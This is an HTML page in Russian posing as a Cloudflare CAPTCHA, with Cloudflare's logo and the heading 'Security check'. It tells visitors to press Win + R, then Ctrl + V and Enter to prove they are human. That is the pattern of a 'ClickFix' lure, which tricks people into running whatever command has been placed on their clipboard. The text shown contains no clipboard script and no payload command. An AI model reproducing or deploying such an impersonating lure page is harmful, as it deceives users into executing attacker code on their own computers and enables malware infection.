<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<title>Cloudflare CAPTCHA</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
  body, html {
    height: 100%;
    margin: 0;
    font-family: 'Roboto', sans-serif;
    background: linear-gradient(135deg, #667eea, #764ba2);
    display: flex;
    justify-content: center;
    align-items: center;
    color: #333;
  }
  .captcha-container {
    background: white;
    padding: 40px 50px;
    border-radius: 12px;
    box-shadow: 0 8px 24px rgba(0,0,0,0.2);
    text-align: center;
    max-width: 400px;
    width: 90%;
  }
  .captcha-title {
    font-weight: 700;
    font-size: 24px;
    margin-bottom: 20px;
    color: #1E1E1E;
  }
  .captcha-desc {
    font-size: 16px;
    margin-bottom: 30px;
    color: #616161;
  }
  .captcha-icon {
    margin-bottom: 30px;
    display: flex;
    justify-content: center;
  }
  .captcha-icon img {
    height: 50px; /* или width: 50px — по желанию */
    display: block;
  }
  .instructions {
    display: inline-block;
    background: #f5f5f7;
    border-radius: 8px;
    padding: 15px 20px;
    font-family: monospace;
    font-size: 16px;
    color: #333;
    user-select: all;
  }
  .footer-text {
    margin-top: 40px;
    font-size: 12px;
    color: #a1a1a1;
  }
</style>
</head>
<body>
<div class="captcha-container" role="main" aria-labelledby="captchaHeading">
  <div class="captcha-icon">
    <img src="https://cf-assets.www.cloudflare.com/dzlvafdwdttg/69wNwfiY5mFmgpd9eQFW6j/d5131c08085a977aa70f19e7aada3fa9/1pixel-down__1_.svg" alt="Cloudflare CAPTCHA icon">
  </div>
  <h1 id="captchaHeading" class="captcha-title">Проверка безопасности</h1>
  <p class="captcha-desc">
    Пожалуйста, подтвердите, что вы не робот, выполнив следующие действия:
  </p>
  <div class="instructions" tabindex="0">
    Нажмите <strong>Win + R</strong>, затем <strong>Ctrl + V</strong> и <strong>Enter</strong>
  </div>
  <p class="footer-text">Спасибо за понимание и сотрудничество.</p>
</div>
</body>
</html>
